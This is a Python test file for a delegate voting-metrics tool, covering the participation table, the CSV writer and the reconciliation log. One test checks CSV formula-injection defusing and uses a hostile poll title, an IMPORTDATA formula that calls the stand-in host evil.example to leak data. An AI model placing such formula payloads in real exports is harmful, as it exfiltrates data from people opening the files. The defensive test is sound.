"""Tests for outputs: the participation table, the CSV writer, and the reconciliation log."""

import json
from datetime import UTC, date, datetime
from pathlib import Path
from typing import cast

import pandas as pd

from ad_voting_metrics.ballots import Ballot
from ad_voting_metrics.outputs import (
    PARTICIPATION_METADATA_COLUMNS,
    ReconciliationEntry,
    build_participation_dataframe,
    build_reconciliation_entry,
    write_csvs,
    write_reconciliation_entry,
)
from ad_voting_metrics.period import MonthPeriod
from ad_voting_metrics.roster import Delegate, DelegatesConfig, RosterResult
from tests.helpers import ADDR_A, ADDR_B, ADDR_C, delegate

_PERIOD = MonthPeriod(2026, 4)
_ROSTER_PATH = Path("/tmp/delegates.yaml")


def _poll(poll_id: str, start: date, end: date, title: str) -> Ballot:
    return Ballot(id=poll_id, start=start, end=end, title=title)


def _spell(address: str, start: date, title: str) -> Ballot:
    return Ballot(id=address, start=start, end=None, title=title)


_DELEGATES = [delegate("BLUE", ADDR_A), delegate("Cloaky", ADDR_B), delegate("BONAPUBLICA", ADDR_C)]
_POLL_1 = _poll("12345", date(2026, 4, 5), date(2026, 4, 7), "Approve SubDAO X")
_POLL_2 = _poll("67890", date(2026, 4, 12), date(2026, 4, 14), "Adjust risk")
_SPELL = _spell("0xspell001", date(2026, 4, 20), "Spell: April risk adjustment")
_BALLOTS = [_POLL_1, _POLL_2, _SPELL]
_STATUSES = {
    (ADDR_A, "12345"): "Yes",
    (ADDR_B, "12345"): "No",
    (ADDR_C, "12345"): "Yes",
    (ADDR_A, "67890"): "Pending verification",
    (ADDR_B, "67890"): "Yes",
    (ADDR_C, "67890"): "Yes",
    (ADDR_A, "0xspell001"): "Yes",
    (ADDR_B, "0xspell001"): "No Delegated SKY",
    (ADDR_C, "0xspell001"): "Yes",
}


def test_build_participation_dataframe_one_row_per_ballot_with_metadata_then_delegates():
    out = build_participation_dataframe(_DELEGATES, _BALLOTS, _STATUSES)

    assert list(out.columns) == [*PARTICIPATION_METADATA_COLUMNS, "BLUE", "Cloaky", "BONAPUBLICA"]
    assert len(out) == 3
    row = out[out["Poll Id"] == "12345"].iloc[0]
    assert row["Start Date"] == "2026-04-05"
    assert row["End Date"] == "2026-04-07"
    assert row["Title"] == "Approve SubDAO X"
    assert (row["BLUE"], row["Cloaky"], row["BONAPUBLICA"]) == ("Yes", "No", "Yes")


def test_build_participation_dataframe_spell_row_has_blank_end_date():
    out = build_participation_dataframe(_DELEGATES, _BALLOTS, _STATUSES)

    row = out[out["Poll Id"] == "0xspell001"].iloc[0]
    assert row["Start Date"] == "2026-04-20"
    assert row["End Date"] == ""
    assert row["Title"] == "Spell: April risk adjustment"
    assert row["Cloaky"] == "No Delegated SKY"


def test_build_participation_dataframe_missing_status_is_blank():
    statuses = {k: v for k, v in _STATUSES.items() if k != (ADDR_B, "12345")}

    row = build_participation_dataframe(_DELEGATES, _BALLOTS, statuses).iloc[0]

    assert row["Cloaky"] == ""
    assert row["BLUE"] == "Yes"


def test_build_participation_dataframe_sorts_by_start_date_keeping_input_order_for_ties():
    """Rows come out chronologically regardless of input order; same-day ballots keep their given order."""
    same_day_spell = _spell("0xspell002", _POLL_1.start, "Same day as poll 1")
    ballots = [_SPELL, same_day_spell, _POLL_2, _POLL_1]

    out = build_participation_dataframe(_DELEGATES, ballots, _STATUSES)

    assert list(out["Poll Id"]) == ["0xspell002", "12345", "67890", "0xspell001"]


def test_build_participation_dataframe_zero_ballots_returns_header_only():
    out = build_participation_dataframe(_DELEGATES[:2], [], {})

    assert list(out.columns) == [*PARTICIPATION_METADATA_COLUMNS, "BLUE", "Cloaky"]
    assert len(out) == 0


def _daily():
    return pd.DataFrame([{"contract": ADDR_A, "name": "BLUE", "date": date(2026, 4, 1), "sky": 100.0, "rank": 1}])


def test_write_csvs_creates_the_directory_and_writes_both_files(tmp_path):
    out_dir = tmp_path / "2026-04"

    result = write_csvs(out_dir, _daily(), build_participation_dataframe(_DELEGATES, _BALLOTS, _STATUSES))

    assert [p.relative_to(tmp_path).as_posix() for p in result] == ["2026-04/sky.csv", "2026-04/vote_participation.csv"]
    assert all(p.exists() for p in result)
    assert (out_dir / "sky.csv").read_text().splitlines()[0] == "contract,name,date,sky,rank"
    participation = pd.read_csv(out_dir / "vote_participation.csv", dtype=str, keep_default_na=False)
    assert list(participation["Poll Id"]) == ["12345", "67890", "0xspell001"]


def test_write_csvs_defuses_formula_like_titles(tmp_path):
    """API-sourced titles starting with a formula character are quoted so spreadsheet apps render them as text."""
    hostile = _poll("12345", date(2026, 4, 5), date(2026, 4, 7), '=IMPORTDATA("https://evil.example/leak")')

    write_csvs(tmp_path, _daily(), build_participation_dataframe(_DELEGATES, [hostile], _STATUSES))

    participation = (tmp_path / "vote_participation.csv").read_text()
    assert "'=IMPORTDATA" in participation
    assert '"=IMPORTDATA' not in participation


def _roster(
    config: DelegatesConfig | None = None,
    *,
    active: list[Delegate] | None = None,
    warnings: list[str] | None = None,
    api_count: int | None = 0,
) -> RosterResult:
    return RosterResult(
        active_delegates=active or [],
        drift_warnings=warnings or [],
        yaml_config=config or DelegatesConfig(delegates=[delegate()]),
        api_delegate_count=api_count,
    )


def _entry(**overrides: object) -> ReconciliationEntry:
    """A complete entry; tests override only the fields they assert on."""
    base: ReconciliationEntry = {
        "run_timestamp": "2026-05-06T15:32:08+00:00",
        "period": "April 2026",
        "roster_path": str(_ROSTER_PATH),
        "roster_delegates": 0,
        "roster_active_delegates": 0,
        "active_during_period": 0,
        "api_delegate_count": 0,
        "drift_warnings": [],
        "last_synced_block": 22_500_000,
        "output_files": [],
    }
    return cast("ReconciliationEntry", {**base, **overrides})


def test_build_reconciliation_entry_populates_every_field():
    config = DelegatesConfig(
        delegates=[delegate("A", ADDR_A), delegate("B", ADDR_B), delegate("C", ADDR_C, end=date(2025, 6, 30))]
    )
    roster = _roster(config, active=config.delegates[:2], warnings=["drift"], api_count=2)

    entry = build_reconciliation_entry(
        period=_PERIOD,
        roster_path=_ROSTER_PATH,
        roster=roster,
        last_synced_block=22_500_000,
        output_files=[Path("o/a.csv")],
    )

    assert datetime.fromisoformat(entry["run_timestamp"]).tzinfo == UTC
    assert entry == {
        "run_timestamp": entry["run_timestamp"],
        "period": "April 2026",
        "roster_path": str(_ROSTER_PATH.resolve()),
        "roster_delegates": 3,
        "roster_active_delegates": 2,
        "active_during_period": 2,
        "api_delegate_count": 2,
        "drift_warnings": ["drift"],
        "last_synced_block": 22_500_000,
        "output_files": [str(Path("o/a.csv").resolve())],
    }


def test_build_reconciliation_entry_records_a_failed_api_fetch_as_null_count():
    entry = build_reconciliation_entry(
        period=_PERIOD, roster_path=_ROSTER_PATH, roster=_roster(api_count=None), last_synced_block=1, output_files=[]
    )

    assert entry["api_delegate_count"] is None


def test_write_reconciliation_entry_names_file_by_period_and_timestamp_and_round_trips_json(tmp_path):
    """Colons become hyphens and +00:00 becomes Z in the name; non-ASCII content is written unescaped."""
    entry = _entry(run_timestamp="2026-05-06T15:32:08.123456+00:00", drift_warnings=["✓ Cüstom Délégate"])

    path = write_reconciliation_entry(tmp_path, _PERIOD, entry)

    expected = tmp_path / "2026-04_2026-05-06T15-32-08.123456Z.json"
    assert path == expected
    assert "Cüstom" in expected.read_text(encoding="utf-8")
    assert json.loads(expected.read_text(encoding="utf-8")) == entry


def test_write_reconciliation_entry_creates_missing_directories(tmp_path):
    target = tmp_path / "deep" / "nested"

    path = write_reconciliation_entry(target, _PERIOD, _entry())

    assert list(target.iterdir()) == [path]


def test_write_reconciliation_entry_soft_fails_on_io_error(caplog, monkeypatch):
    def boom(*args, **kwargs):
        raise PermissionError("no write access")

    monkeypatch.setattr(Path, "mkdir", boom)

    with caplog.at_level("WARNING"):
        result = write_reconciliation_entry(Path("/anywhere/reconciliation"), _PERIOD, _entry())

    assert result is None
    assert "Failed to write reconciliation log" in caplog.text
